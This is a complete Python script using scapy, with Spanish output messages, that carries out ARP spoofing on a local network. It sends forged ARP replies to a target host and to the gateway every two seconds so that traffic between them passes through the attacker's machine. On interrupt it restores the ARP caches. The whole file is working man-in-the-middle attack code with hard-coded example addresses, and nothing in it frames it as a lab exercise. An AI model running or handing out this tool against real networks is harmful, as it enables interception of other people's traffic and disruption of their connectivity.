from scapy.all import *
import time
import sys

from scapy.layers.l2 import getmacbyip, Ether, ARP


def arp_spoof(target_ip, gateway_ip, interface):
    try:
        target_mac = getmacbyip(target_ip)
        gateway_mac = getmacbyip(gateway_ip)
    except:
        print("[!] Error obteniendo MACs.")
        sys.exit(1)

    print(f"[*] Spoofing: {target_ip} <-> {gateway_ip}")

    arp_target = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    arp_gateway = Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)

    while True:
        try:
            sendp(arp_target, iface=interface, verbose=False)
            sendp(arp_gateway, iface=interface, verbose=False)
            time.sleep(2)
        except KeyboardInterrupt:
            print("\n[!] Deteniendo...")
            restore_arp(target_ip, gateway_ip, interface)
            sys.exit(0)

def restore_arp(target_ip, gateway_ip, interface):
    target_mac = getmacbyip(target_ip)
    gateway_mac = getmacbyip(gateway_ip)
    sendp(Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=False)
    sendp(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), count=5, verbose=False)
    print("[+] ARP restaurado.")

if __name__ == "__main__":
    TARGET_IP = "192.168.1.100"
    GATEWAY_IP = "192.168.1.1"
    INTERFACE = "en0"  # Usa tu interfaz real (ej: en0 en macOS)
    arp_spoof(TARGET_IP, GATEWAY_IP, INTERFACE)